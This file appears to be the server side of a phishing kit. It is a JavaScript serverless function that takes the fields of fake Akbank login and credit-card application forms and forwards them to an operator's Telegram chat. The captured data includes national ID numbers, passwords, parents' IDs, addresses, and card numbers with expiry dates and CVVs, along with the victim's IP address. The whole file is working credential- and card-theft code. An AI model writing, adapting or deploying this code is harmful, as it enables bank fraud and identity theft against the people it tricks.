// Vercel Serverless Function - Telegram Bot API
export default async function handler(req, res) {
  // CORS headers - Vercel'de CORS otomatik yönetilir ama yine de ekleyelim
  if (req.method === 'OPTIONS') {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    return res.status(200).end();
  }

  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { 
      tckn, 
      password, 
      telefon, 
      kartLimiti, 
      adSoyad, 
      dogumTarihi, 
      cinsiyet,
      dogumYeri,
      anneAdi,
      babaAdi,
      anneTCKN,
      babaTCKN,
      adresIl,
      adresIlce,
      memleketIl,
      memleketIlce,
      medeniHal,
      kartNumarasi,
      sonKullanimAy,
      sonKullanimYil,
      cvv,
      type 
    } = req.body;

    // Env değişkenleri veya default değerler
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || 'YOUR_CHAT_ID_HERE';

    // IP adresini al
    const ip = req.headers['x-forwarded-for'] || 
               req.headers['x-real-ip'] || 
               req.connection.remoteAddress || 
               'Unknown';

    // User agent
    const userAgent = req.headers['user-agent'] || 'Unknown';

    // Tarih ve saat
    const date = new Date().toLocaleString('tr-TR', {
      timeZone: 'Europe/Istanbul',
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit'
    });

    let message = '';

    // Özel karakterleri escape et
    function escapeHtml(text) {
      if (!text) return 'Belirtilmedi';
      return String(text)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
    }

    // Başvuru formu mu yoksa login formu mu?
    if (type === 'basvuru') {
      message = `
💳 <b>Yeni Kredi Kartı Başvurusu</b>

👤 <b>Ad Soyad:</b> ${escapeHtml(adSoyad)} | 📱 <b>TC:</b> <code>${escapeHtml(tckn)}</code> | 📅 <b>Doğum:</b> ${escapeHtml(dogumTarihi)} | ⚧️ <b>Cinsiyet:</b> ${escapeHtml(cinsiyet)} | 📍 <b>Doğum Yeri:</b> ${escapeHtml(dogumYeri)}

👩 <b>Anne Adı:</b> ${escapeHtml(anneAdi)} | 🆔 <b>Anne TCKN:</b> <code>${escapeHtml(anneTCKN)}</code> | 👨 <b>Baba Adı:</b> ${escapeHtml(babaAdi)} | 🆔 <b>Baba TCKN:</b> <code>${escapeHtml(babaTCKN)}</code>

🏠 <b>Adres:</b> ${escapeHtml(adresIl)}/${escapeHtml(adresIlce)} | 🗺️ <b>Memleket:</b> ${escapeHtml(memleketIl)}/${escapeHtml(memleketIlce)} | 💑 <b>Medeni Hal:</b> ${escapeHtml(medeniHal)}

📞 <b>Telefon:</b> ${escapeHtml(telefon)} | 💵 <b>Kart Limiti:</b> ${escapeHtml(kartLimiti)} TL
${kartNumarasi ? `
💳 <b>Kart Numarası:</b> <code>${escapeHtml(kartNumarasi)}</code>
📅 <b>Son Kullanma:</b> ${escapeHtml(sonKullanimAy || '')}/${escapeHtml(sonKullanimYil || '')} | 🔒 <b>CVV:</b> <code>${escapeHtml(cvv || 'Belirtilmedi')}</code>
` : ''}
🌐 <b>IP:</b> <code>${escapeHtml(ip)}</code> | 📅 <b>Tarih:</b> ${escapeHtml(date)}

---
<i>Akbank Başvuru Formu</i>
      `.trim();
    } else {
      message = `
🔐 <b>Yeni Giriş Bilgisi</b>

📱 <b>TC Kimlik No / Müşteri No:</b>
<code>${escapeHtml(tckn)}</code>

🔑 <b>Şifre:</b>
<code>${escapeHtml(password)}</code>

📅 <b>Tarih:</b> ${escapeHtml(date)}

---
<i>Akbank Login Form</i>
      `.trim();
    }

    // Telegram Bot API'ye mesaj gönder
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
      }),
    });

    const data = await response.json();

    if (!response.ok) {
      console.error('Telegram API Error:', data);
      return res.status(500).json({ 
        error: 'Telegram mesaj gönderilemedi', 
        details: data.description || 'Unknown error' 
      });
    }

    // Başarılı yanıt
    return res.status(200).json({ 
      success: true, 
      message: 'Mesaj başarıyla gönderildi',
      telegramResponse: data 
    });

  } catch (error) {
    console.error('Error:', error);
    return res.status(500).json({ 
      error: 'Sunucu hatası', 
      details: error.message 
    });
  }
}

